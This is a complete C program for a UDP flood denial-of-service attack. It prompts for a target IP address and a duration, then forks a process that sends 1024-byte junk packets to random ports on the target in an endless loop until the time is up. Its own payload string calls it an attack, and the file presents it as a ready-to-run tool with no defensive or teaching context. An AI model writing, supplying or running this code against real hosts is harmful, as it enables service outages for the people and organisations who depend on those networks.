#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>
#include <signal.h>

static char garbage[1024] = "This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack. This is an udp flooding attack.";

int attack(char *target, unsigned int t){
	pid_t child = 0;
	int status;

	if((child = fork()) == -1){
	       perror("fork()");
	       return -1;
	}

	if(child == 0){ // child
		int sockfd;
		struct sockaddr_in servaddr;

		if( (sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0){
			perror("socket()");
			exit(-1);
		}

		memset(&servaddr, 0, sizeof(servaddr));

		servaddr.sin_family = AF_INET;
		servaddr.sin_port = htons(rand() % 65536);
		servaddr.sin_addr.s_addr = inet_addr(target);

		int ret;
		for(;;){
			ret = sendto(sockfd, garbage, 1024, MSG_DONTWAIT, (struct sockaddr*)&servaddr, sizeof(servaddr));
		}
		exit(0);
	}
	sleep(t);
	kill(child,SIGKILL);
	waitpid(child, &status, 0);

	return 0;
}

int main(){
	char target[16] = "";
	unsigned int t;
	char host[256]={};
	printf("> ");
	while(scanf("%s %d", target, &t) != EOF){
		attack(target,t);
		printf("> ");
	}
	return 0;
}
